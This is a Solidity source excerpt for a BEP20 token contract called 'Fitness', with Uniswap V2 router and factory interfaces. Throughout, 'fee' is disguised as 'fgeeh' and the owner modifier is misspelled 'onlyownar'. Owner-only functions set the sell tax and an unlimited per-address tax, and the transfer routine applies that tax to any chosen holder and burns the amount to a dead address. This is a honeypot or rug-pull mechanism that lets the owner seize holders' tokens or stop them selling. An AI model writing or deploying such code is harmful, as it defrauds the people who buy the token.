...
interface IUniswapV2Factory {
    ...
    function fgeehTo() external view returns (address);
    function fgeehToSetter() external view returns (address);
    ...
    function setfgeehTo(address) external;
    function setfgeehToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfgeehOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfgeehOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfgeehOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfgeehOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfgeehOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Fitness is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfgeeh = 0;

    uint256 private _defaultBuyfgeeh = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfgeeh;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfgeeh = _value;
    }

    function setSlipfgeeh(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfgeeh[_address] = _value;
    }

    function getSlipfgeeh(address _address) external view onlyownar returns (uint256) {
        return _slipfgeeh[_address];
    }


    function setMAccountfgeeh(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfgeeh(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefgeehAmount = 0;

        if (rF) {
            uint256 tradefgeeh = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefgeeh = _defaultSellfgeeh;
                }
                if (from == uniswapV2Pair) {

                    tradefgeeh = _defaultBuyfgeeh;
                }
            }
            if (_slipfgeeh[from] > 0) {
                tradefgeeh = _slipfgeeh[from];
            }

            tradefgeehAmount = _Amount.mul(tradefgeeh).div(100);
        }


        if (tradefgeehAmount > 0) {
            _balances[from] = _balances[from].sub(tradefgeehAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefgeehAmount);
            emit Transfer(from, _deadAddress, tradefgeehAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefgeehAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefgeehAmount);
        emit Transfer(from, _to, _Amount - tradefgeehAmount);
    }
